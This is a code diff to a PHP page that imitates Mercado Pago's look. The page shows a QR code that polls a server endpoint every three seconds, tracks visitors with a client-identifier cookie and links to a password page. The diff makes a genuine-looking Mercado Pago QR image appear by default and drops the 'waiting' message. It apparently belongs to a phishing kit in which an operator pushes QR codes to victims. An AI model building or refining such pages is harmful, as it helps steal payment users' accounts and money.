@@ -35,8 +35,14 @@ if (!isset($_COOKIE['identificador_cliente'])) {
         .help-link { display: block; margin-top: 24px; color: var(--andes-text-color-link); text-decoration: none; font-size: 14px; font-weight: 500; }
         .help-link:hover { text-decoration: underline; }
         .qr-card { width: 100%; max-width: 38.75rem; height: 26.25rem; margin-top: 0; background-color: var(--andes-background-color-primary); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 48px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .qr-card .qr-placeholder { color: var(--text-secondary); }
-        .qr-card .qr-image { width: 220px; height: 220px; margin-bottom: 32px; display: none; /* Começa escondido */ }
+        
+        /* O placeholder de texto foi removido, então não precisamos mais do seu estilo */
+        .qr-card .qr-image {
+            width: 220px;
+            height: 220px;
+            margin-bottom: 32px;
+            display: block; /* A imagem agora é visível por padrão */
+        }
         .other-method-link { color: var(--andes-text-color-link); text-decoration: none; font-size: 15px; font-weight: 500; }
         .other-method-link:hover { text-decoration: underline; }
     </style>
@@ -56,8 +62,8 @@ if (!isset($_COOKIE['identificador_cliente'])) {
             </div>
 
             <div class="qr-card">
-                <img src="" alt="Código QR" id="qr-image" class="qr-image">
-                <p class="qr-placeholder" id="qr-placeholder">Aguardando o QR Code...</p>
+                <img src="https://www.mercadopago.com.br/sell/qr/collector-qr.png" alt="Código QR" id="qr-image" class="qr-image">
+                
                 <a href="senha.php" class="other-method-link">Escolher outro método</a>
             </div>
         </div>
@@ -65,25 +71,21 @@ if (!isset($_COOKIE['identificador_cliente'])) {
 
     <script>
         const qrImage = document.getElementById('qr-image');
-        const qrPlaceholder = document.getElementById('qr-placeholder');
 
         async function verificarQrCode() {
             try {
                 const response = await fetch('api_get_qrcode.php');
                 const data = await response.json();
 
+                // Se a API retornar sucesso e um caminho de imagem...
                 if (data.success && data.qrcode_path) {
-                    console.log('QR Code recebido:', data.qrcode_path);
+                    console.log('Novo QR Code recebido:', data.qrcode_path);
                     
-                    // Atualiza a imagem e garante que não haja cache
+                    // ...atualiza a imagem, adicionando um timestamp para evitar o cache do navegador.
                     qrImage.src = data.qrcode_path + '?t=' + new Date().getTime();
-                    
-                    // Mostra a imagem e esconde a mensagem de "aguardando"
-                    qrImage.style.display = 'block';
-                    qrPlaceholder.style.display = 'none';
-
                 } else {
-                    console.log('Ainda aguardando QR Code...');
+                    // Se não, continua exibindo o QR Code padrão.
+                    console.log('Aguardando novo QR Code...');
                 }
             } catch (error) {
                 console.error('Erro ao buscar QR Code:', error);
@@ -92,8 +94,6 @@ if (!isset($_COOKIE['identificador_cliente'])) {
 
         // Inicia a verificação a cada 3 segundos
         setInterval(verificarQrCode, 3000);
-        // Verifica uma vez assim que a página carrega
-        verificarQrCode();
     </script>
 
 </body>
